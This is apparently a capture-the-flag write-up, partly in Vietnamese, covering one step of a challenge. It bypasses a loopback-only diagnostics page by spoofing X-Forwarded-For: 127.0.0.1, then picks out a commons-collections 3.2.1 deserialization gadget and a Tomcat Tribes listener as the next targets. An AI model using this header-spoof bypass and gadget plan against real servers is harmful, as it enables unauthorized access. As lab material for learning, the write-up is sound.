# 02 — Diagnostics console: X-Forwarded-For spoof

## Tìm endpoint

Dirbust `/diagnostics.jsp` (cùng thư mục với mirror.jsp như Entry 007 nói):

```
GET /diagnostics.jsp
→ 403 {"error":"access denied","quip":"Entry is available only from the local garage.
      Proxies talk too much, citizen."}
```

## Bypass

Entry 007: proxy "trusted to tell the truth" + coffee stain "headers" → thử header:

```
GET /diagnostics.jsp HTTP/1.1
X-Forwarded-For: 127.0.0.1
→ 200 (JSON đầy đủ)
```

Chỉ **loopback** mới được (`10.0.0.1`, `192.168.1.1`, `172.17.0.1` vẫn 403). `::1` và `localhost` cũng pass — check là so sánh string prefix/contains với loopback chứ không phải subnet.

## Output — xác nhận toàn bộ giả thuyết

```json
{
  "server": "Apache Tomcat/9.0.116",
  "os": "Linux/amd64",
  "runningAs": "citadel",
  "classpathJars": [..., "commons-collections-3.2.1.jar", ...],   // ← gadget khả dụng
  "listeners": {
    "intranet": "http 0.0.0.0:8080",
    "garageGateway": "tribes receiver tcp *:4000",                // ← Tribes!
    "gatewayCipher": "AES/CBC/PKCS5Padding"                       // ← đúng Entry 002
  },
  "multiverseSync": {"membership": "multicast 228.13.37.7:45564"},
  "citadelLayout": {
    "vault": "/opt/citadel/vault (root-owned, randomised labels)",
    "gate":  "/opt/citadel/gate (root-owned, randomised labels)",
    "shelf": "/opt/citadel/shared (world-writable, 15min TTL)",
    "shelfMirror": "/mirror.jsp"
  }
}
```

Ba giá trị quyết định bước tiếp theo:

1. `commons-collections-3.2.1.jar` — đúng version có InvokerTransformer chưa bị patch (guard chỉ thêm ở 3.2.2+)
2. `tribes receiver tcp *:4000` — gateway **không phải** custom socket mà là Tomcat Tribes → phải frame theo chuẩn Tribes, không phải java serialization trần
3. AES/CBC/PKCS5 — nhưng Entry 003 cho biết seal fail vẫn ship

## Diagnostics không nhận thêm param nào

Thử `action/cmd/help/exec/...` — output hash không đổi. Console chỉ để đọc info, không phải injection point.
